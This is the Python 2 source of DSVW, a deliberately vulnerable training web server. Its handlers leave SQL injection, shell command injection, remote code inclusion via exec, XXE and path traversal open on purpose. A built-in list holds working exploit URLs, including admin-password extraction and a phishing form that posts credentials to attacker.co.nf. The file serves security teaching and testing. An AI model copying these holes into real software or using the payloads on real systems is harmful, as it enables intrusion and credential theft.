#!/usr/bin/env python
import BaseHTTPServer, cgi, cStringIO, httplib, os, re, SocketServer, sqlite3, sys, subprocess, time, traceback, urllib
try:
    import lxml.etree
except ImportError:
    print "[!] please install 'python-lxml' to (also) get access to XML vulnerabilities (e.g. 'apt-get install python-lxml')\n"

NAME, VERSION, GITHUB, AUTHOR, LICENSE = "Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code)", "0.1d", "https://github.com/stamparm/DSVW", "Miroslav Stampar (@stamparm)", "Public domain (FREE)"
HTML_PREFIX, HTML_POSTFIX = "<!DOCTYPE html><html><head><style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style><title>%s</title></head><body style='font: 12px monospace'><script>var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style=\"position: absolute; top: 5px; right: 5px;\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>" % cgi.escape(NAME), "<div style=\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\">Powered by <a href=\"%s\" style=\"font-weight: bold; text-decoration: none; visited: blue; color: blue\" target=\"_blank\">%s</a> (v<b>%s</b>)</div></body></html>" % (GITHUB, re.search(r"\(([^)]+)", NAME).group(1), VERSION)
HTTP_ADDRESS, HTTP_PORT = "0.0.0.0", 65412
USERS_XML = """<?xml version="1.0" encoding="utf-8"?><users><user id="0"><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user><user id="1"><name>dian</name><surname>ricci</surname><password>12345</password></user><user id="2"><name>anthony</name><surname>mason</surname><password>gandalf</password></user><user id="3"><name>sandra</name><surname>vargas</surname><password>phest1945</password></user></users>"""
CASES = (("Blind SQL Injection (<i>boolean</i>)", "?id=1", "/?id=1%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27\" onclick=\"alert('checking if the first character for admin\\'s password is digit \\'7\\' (true in case of same result(s) as for \\'vulnerable\\')')", "https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29#Boolean_Exploitation_Technique"), ("Blind SQL Injection (<i>time</i>)", "?id=1", "/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))\" onclick=\"alert('checking if the second character for admin\\'s password is letter \\'e\\' (true in case of delayed response)')", "https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29#Time_delay_Exploitation_technique"), ("UNION SQL Injection", "?id=1", "/?id=1%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cname%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20name%3D%27admin%27)", "https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29#Union_Exploitation_Technique"), ("Cross Site Scripting (<i>reflected</i>)", "/?v=0.2", "/?v=0.2%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E", "https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_%28OTG-INPVAL-001%29"), ("Cross Site Scripting (<i>stored</i>)", "/?comment=\" onclick=\"document.location='/?comment='+prompt('please leave a comment'); return false", "/?comment=%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E", "https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_%28OTG-INPVAL-002%29"), ("Cross Site Scripting (<i>DOM</i>)", "/?#lang=en", "/?foobar#lang=en%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E", "https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_%28OTG-CLIENT-001%29"), ("XML External Entity (<i>file</i>)", "/?xml=%3Croot%3E%3C%2Froot%3E", "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E" if not subprocess.mswindows else "/?xml=%3C!DOCTYPE%20example%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2FC%3A%2FWindows%2Fwin.ini%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E", "https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29"), ("Blind XPath Injection (<i>boolean</i>)", "/?name=dian", "/?name=admin%27%20and%20substring(password%2Ftext()%2C3%2C1)%3D%27n\" onclick=\"alert('checking if the third character for admin\\'s password is letter \\'n\\' (true in case of found item)')", "https://www.owasp.org/index.php/XPATH_Injection"), ("Cross Site Request Forgery", "/?comment=", "/?v=%3Cimg%20src%3D%22%2F%3Fcomment%3D%253Cdiv%2520style%253D%2522color%253Ared%253B%2520font-weight%253A%2520bold%2522%253EI%2520quit%2520the%2520job%253C%252Fdiv%253E%22%3E\" onclick=\"alert('please visit \\'vulnerable\\' page to see what this click has caused')", "https://www.owasp.org/index.php/Testing_for_CSRF_%28OTG-SESS-005%29"), ("Frame Injection", "/?v=0.2", "/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fattacker.co.nf%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E", "http://www.gnucitizen.org/blog/frame-injection-fun/"), ("Clickjacking", None, "/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fattacker.co.nf%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E", "https://www.owasp.org/index.php/Testing_for_Clickjacking_%28OTG-CLIENT-009%29"), ("Unvalidated Redirect", "/?redir=", "/?redir=http%3A%2F%2Fattacker.co.nf", "https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"), ("Arbitrary Code Execution", "/?domain=www.google.com", "/?domain=www.google.com%3B%20ifconfig" if not subprocess.mswindows else "/?domain=www.google.com%26%20ipconfig", "https://en.wikipedia.org/wiki/Arbitrary_code_execution"), ("Full Path Disclosure", "/?include=", "/?include=foobar", "https://www.owasp.org/index.php/Full_Path_Disclosure"), ("Source Code Disclosure", "/?path=", "/?path=dsvw.py", "https://www.imperva.com/resources/glossary?term=source_code_disclosure"), ("Path Traversal", "/?path=", "/?path=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd" if not subprocess.mswindows else "/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini", "https://www.owasp.org/index.php/Path_Traversal"), ("File Inclusion (<i>remote</i>)", "/?include=", "/?include=http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3DN5ccE6iH&cmd=ls%20%2f", "https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion"), ("HTTP Header Injection", "/?charset=utf8", "/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:389%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fattacker.co.nf%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fattacker.co.nf%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Submit%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E", "https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection"), ("Denial of Service (<i>memory</i>)", "/?size=32", "/?size=9999999", "https://www.owasp.org/index.php/Denial_of_Service"))

def init():
    global connection
    connection = sqlite3.connect(":memory:", check_same_thread=False)
    connection.isolation_level = None
    cursor = connection.cursor()
    cursor.execute("CREATE TABLE users(id INTEGER, name TEXT, surname TEXT, password TEXT)")
    cursor.executemany("INSERT INTO users(id, name, surname, password) VALUES(?, ?, ?, ?)", ((0, 'admin', 'admin', '7en8aiDoh!'), (1, 'dian', 'ricci', '12345'), (2, 'anthony', 'mason', 'gandalf'), (3, 'sandra', 'vargas', 'phest1945')))
    cursor.execute("CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)")

class ReqHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, "")
        code, content, params, cursor = httplib.OK, HTML_PREFIX, dict((match.group("parameter"), urllib.unquote(match.group("value"))) for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)(?P<value>[^&]+)", query)), connection.cursor()
        try:
            if path == '/':
                if "id" in params:
                    cursor.execute("SELECT id, name, surname FROM users WHERE id=" + params["id"])
                    content += "<div><span>Result(s):</span></div><table><thead><th>id</th><th>name</th><th>surname</th></thead>"
                    content += "".join("<tr>%s</tr>" % "".join("<td>%s</td>" % _ for _ in row) for row in cursor.fetchall())
                    content += "</table>%s" % HTML_POSTFIX
                elif "v" in params:
                    content += re.sub(r"(v<b>)[^<]+(</b>)", r"\g<1>%s\g<2>" % params["v"], HTML_POSTFIX)
                elif "path" in params:
                    content = (open(params["path"], "rb") if not "://" in params["path"] else urllib.urlopen(params["path"])).read()
                elif "domain" in params:
                    content = subprocess.check_output("nslookup " + params["domain"], shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
                elif "xml" in params:
                    content = lxml.etree.tostring(lxml.etree.parse(cStringIO.StringIO(params["xml"])), pretty_print=True)
                elif "name" in params:
                    found = lxml.etree.parse(cStringIO.StringIO(USERS_XML)).xpath(".//user[name/text()='%s']" % params["name"])
                    content += "<b>Surname:</b> %s%s" % (found[-1].find("surname").text if found else "-", HTML_POSTFIX)
                elif "size" in params:
                    start = time.time()
                    "<br>".join("#" * int(params["size"]) for _ in range(int(params["size"])))
                    content += "<b>Time required</b> (to &quot;resize image&quot; to %dx%d): %.6f seconds%s" % (int(params["size"]), int(params["size"]), time.time() - start, HTML_POSTFIX)
                elif "comment" in params or query == "comment=":
                    if "comment" in params:
                        cursor.execute("INSERT INTO comments VALUES(NULL, '%s', '%s')" % (params["comment"], time.ctime()))
                        content += "Thank you for leaving the comment. Please click here <a href=\"/?comment=\">here</a> to see all comments%s" % HTML_POSTFIX
                    else:
                        cursor.execute("SELECT id, comment, time FROM comments")
                        content += "<div><span>Comment(s):</span></div><table><thead><th>id</th><th>comment</th><th>time</th></thead>"
                        content += "".join("<tr>%s</tr>" % "".join("<td>%s</td>" % _ for _ in row) for row in cursor.fetchall())
                        content += "</table>%s" % HTML_POSTFIX
                elif "include" in params:
                    try:
                        backup, sys.stdout = sys.stdout, cStringIO.StringIO()
                        prog, envs = (open(params["include"], "rb") if not "://" in params["include"] else urllib.urlopen(params["include"])).read(), {"DOCUMENT_ROOT": os.getcwd(), "HTTP_USER_AGENT": self.headers.get("User-Agent"), "REMOTE_ADDR": self.client_address[0], "REMOTE_PORT": self.client_address[1], "PATH": path, "QUERY_STRING": query}
                        exec(prog) in envs
                        content += sys.stdout.getvalue()
                        sys.stdout = backup
                    except Exception, ex:
                        content += "problem occurred while trying to include the file '%s' ('%s')" % (os.path.abspath(params["include"]), ex)
                elif "redir" in params:
                    content = content.replace("<title>", "<meta http-equiv=\"refresh\" content=\"0; url=%s\" /><title>" % params["redir"])
                if HTML_PREFIX in content and HTML_POSTFIX not in content:
                    content += "<div><span>Attacks:</span></div><ul>%s</ul>" % ("".join("<li%s>%s - <a href=\"%s\">vulnerable</a>|<a href=\"%s\">exploit</a>|<a href=\"%s\" target=\"_blank\">info</a></li>" % (" class=\"disabled\" title=\"module 'python-lxml' not installed\"" if ("lxml.etree" not in sys.modules and any(_ in case[0].upper() for _ in ("XML", "XPATH"))) else "", case[0], case[1], case[2], case[3]) for case in CASES)).replace("<a href=\"None\">vulnerable</a>|", "<b>-</b>|")
            else:
                code = httplib.NOT_FOUND
        except Exception, ex:
            content = ex.output if isinstance(ex, subprocess.CalledProcessError) else traceback.format_exc()
            code = httplib.INTERNAL_SERVER_ERROR
        finally:
            self.send_response(code)
            self.send_header("Connection", "close")
            self.send_header("X-XSS-Protection", "0")
            self.send_header("Content-Type", "%s%s" % ("text/html" if content.startswith("<!DOCTYPE html>") else "text/plain", "; charset=%s" % params.get("charset", "utf8")))
            self.end_headers()
            self.wfile.write("%s%s" % (content, HTML_POSTFIX if HTML_PREFIX in content and GITHUB not in content else ""))
            self.wfile.flush()
            self.wfile.close()

class ThreadingServer(SocketServer.ThreadingMixIn, BaseHTTPServer.HTTPServer):
    pass

if __name__ == "__main__":
    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
    init()
    print "[i] running HTTP server at '%s:%d'..." % (HTTP_ADDRESS, HTTP_PORT)
    try:
        ThreadingServer((HTTP_ADDRESS, HTTP_PORT), ReqHandler).serve_forever()
    except KeyboardInterrupt:
        print "\r[x] Ctrl-C pressed"
        os._exit(1)